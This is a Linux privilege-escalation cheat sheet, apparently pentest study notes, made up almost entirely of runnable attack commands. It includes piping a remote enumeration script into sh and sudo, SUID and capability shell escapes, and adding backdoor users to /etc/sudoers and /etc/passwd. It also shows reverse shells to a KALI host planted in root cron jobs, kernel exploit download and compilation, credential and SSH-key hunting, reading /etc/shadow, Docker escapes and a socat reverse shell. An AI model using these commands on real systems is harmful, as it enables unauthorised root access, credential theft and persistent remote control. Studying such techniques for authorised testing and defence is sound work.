---
title: "Linux Privilege Escalation"
---

# Linux Privilege Escalation

Linux privilege escalation follows a systematic path: understand the environment, find misconfigurations, and elevate to root. The goal is always to understand *why* something works, not just execute scripts blindly.

## Initial Enumeration

```bash
# Current user context
id
whoami
groups
sudo -l           # What can we run as sudo?

# System info
uname -a          # Kernel version
uname -r
cat /etc/os-release
hostname
cat /etc/issue

# Network
ip a
ip r
ss -tlnp
netstat -tlnp
cat /etc/hosts

# Logged in users
w
who
last
```

## Automated Enumeration

### LinPEAS

```bash
# Download and run
curl http://KALI/linpeas.sh | sh

# Or download first
wget http://KALI/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

# Specific checks
/tmp/linpeas.sh -a   # All checks
/tmp/linpeas.sh -s   # Superfast, less output
```

### LinEnum

```bash
wget http://KALI/LinEnum.sh -O /tmp/linenum.sh
chmod +x /tmp/linenum.sh
/tmp/linenum.sh -t
```

### Linux Smart Enumeration (lse)

```bash
wget http://KALI/lse.sh -O /tmp/lse.sh
chmod +x /tmp/lse.sh
/tmp/lse.sh -l 1    # Level 1
/tmp/lse.sh -l 2    # Level 2 — more thorough
```

## Sudo Exploitation

### Sudo -l Analysis

```bash
sudo -l
# Output examples:
# (ALL) NOPASSWD: /usr/bin/find    → sudo find / -exec /bin/bash \;
# (ALL) NOPASSWD: /usr/bin/vim     → sudo vim -c ':!/bin/bash'
# (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
# (ALL) NOPASSWD: ALL              → sudo bash
```

### GTFOBins

Every binary that can be run as sudo has a potential escalation vector documented at gtfobins.github.io. Common patterns:

```bash
# Editors
sudo vim -c ':!/bin/bash'
sudo nano      # Ctrl+R Ctrl+X → reset; sh 1>&0 2>&0
sudo less /etc/passwd   # !sh

# File operations
sudo find / -exec /bin/bash \;
sudo find / -name anything -exec /bin/bash \;
sudo awk 'BEGIN {system("/bin/bash")}'

# Scripting languages
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo ruby -e 'exec "/bin/bash"'
sudo perl -e 'exec "/bin/bash"'
sudo lua -e 'os.execute("/bin/bash")'

# Network tools
sudo nmap --interactive   # Old nmap only
sudo nmap -p- --script <(echo 'require "os" os.execute "/bin/bash"')

# cp / tee (file write as root)
echo "hacker ALL=(ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers
sudo cp /dev/stdin /etc/sudoers  # Type sudoers line then Ctrl+D

# curl / wget (read files as root)
sudo curl file:///etc/shadow
sudo wget -O - file:///etc/shadow
```

## SUID / SGID Binaries

```bash
# Find all SUID files
find / -perm -u=s -type f 2>/dev/null

# Find SGID files
find / -perm -g=s -type f 2>/dev/null

# Combined
find / -perm /6000 -type f 2>/dev/null

# Common exploitable SUID binaries
# bash → bash -p (preserves privileges)
# find → find . -exec /bin/bash -p \;
# vim → vim -c ':py import pty; pty.spawn("/bin/bash")'
# cp → copy /bin/bash to /tmp, set SUID, run /tmp/bash -p
# nmap (old)
# env → env /bin/bash -p
```

## Cron Job Exploitation

```bash
# List cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron*
cat /etc/cron.d/*
cat /var/spool/cron/crontabs/*

# Monitor new processes (useful to catch cron)
watch -n 0.1 ps aux
# Or:
./pspy64    # PSPY - monitor processes without root
```

### Writable Script Called by Root Cron

```bash
# If root cron runs: * * * * * /usr/local/bin/backup.sh
# And backup.sh is writable:
ls -la /usr/local/bin/backup.sh
echo "bash -i >& /dev/tcp/KALI/4444 0>&1" >> /usr/local/bin/backup.sh
```

### PATH Hijacking in Cron

If a root cron job uses a relative command (without full path):

```bash
# Cron runs: * * * * * cd /tmp && cleanup
# If /tmp is before /usr/bin in PATH:
echo "/bin/bash -i >& /dev/tcp/KALI/4444 0>&1" > /tmp/cleanup
chmod +x /tmp/cleanup
```

## File Permission Misconfigurations

### World-Writable /etc/passwd

```bash
ls -la /etc/passwd
# If writable:
# Generate hash
openssl passwd -1 -salt salt123 "password"
echo "hacker:\$1\$salt123\$hash:0:0:root:/root:/bin/bash" >> /etc/passwd
su hacker
```

### Writable /etc/sudoers

```bash
ls -la /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo bash
```

### Writable /etc/shadow

```bash
# Replace root hash with known password
python3 -c "import crypt; print(crypt.crypt('password', '\$6\$salt'))"
# Edit /etc/shadow with new hash
```

## Capabilities

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Exploitable capabilities
# cap_setuid → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# cap_net_raw → tcpdump, useful for sniffing
# cap_dac_override → read/write any file

# Example: python3 with cap_setuid
/usr/bin/python3 = cap_setuid+eip
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## NFS Shares

```bash
# From attacking machine
showmount -e <target_IP>
cat /etc/exports  # On target — look for no_root_squash

# If no_root_squash on a share:
sudo mount -o rw,vers=2 <target_IP>:/share /mnt/nfs
sudo chown root:root /mnt/nfs/bash_copy
sudo chmod +s /mnt/nfs/bash_copy
# On target:
/tmp/bash_copy -p
```

## Kernel Exploits

```bash
uname -r   # Get kernel version

# DirtyPipe (CVE-2022-0847) — kernel 5.8 to 5.16.11
# DirtyCOW (CVE-2016-5195) — kernel < 4.8.3
# Rds (CVE-2010-3904) — kernel < 2.6.36-rc8

# Compile and run
wget http://KALI/dirty.c
gcc dirty.c -o dirty -pthread
./dirty password
su firefart  # New root user with specified password
```

## Password and Credential Hunting

```bash
# Config files
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password\|passwd" 2>/dev/null
find / -name "*.php" -readable 2>/dev/null | xargs grep -l "password\|passwd" 2>/dev/null

# Database configs
find / -name "wp-config.php" 2>/dev/null
find / -name ".env" 2>/dev/null
find / -name "database.yml" 2>/dev/null
find / -name "settings.py" 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.psql_history
cat ~/.python_history

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Check for readable shadow
cat /etc/shadow 2>/dev/null
```

## Service Exploitation

```bash
# Running services
ps aux
systemctl list-units --type=service --state=running
netstat -tlnp

# Check versions
mysql --version
postgresql --version
apache2 -v

# Internal services (only listening on localhost)
ss -tlnp | grep 127.0.0.1
# Port forward to access from Kali:
ssh -L 8080:127.0.0.1:8080 user@<IP>
```

## Docker / Container Escapes

```bash
# Are we in a container?
cat /proc/1/cgroup | grep docker
ls /.dockerenv

# Are we in the docker group?
id | grep docker

# Docker group → root via volume mount
docker run -it -v /:/mnt alpine chroot /mnt /bin/bash

# Writable docker socket?
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -v /:/mnt -it alpine chroot /mnt /bin/bash
```

## TTY Upgrade (Essential First Step)

Always upgrade the shell before doing privilege escalation — some techniques require a proper TTY:

```bash
# Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then:
Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Script
script /dev/null -c bash
# Then Ctrl+Z → stty raw -echo; fg

# Socat (stable)
# On Kali:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# On target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:KALI:4444
```
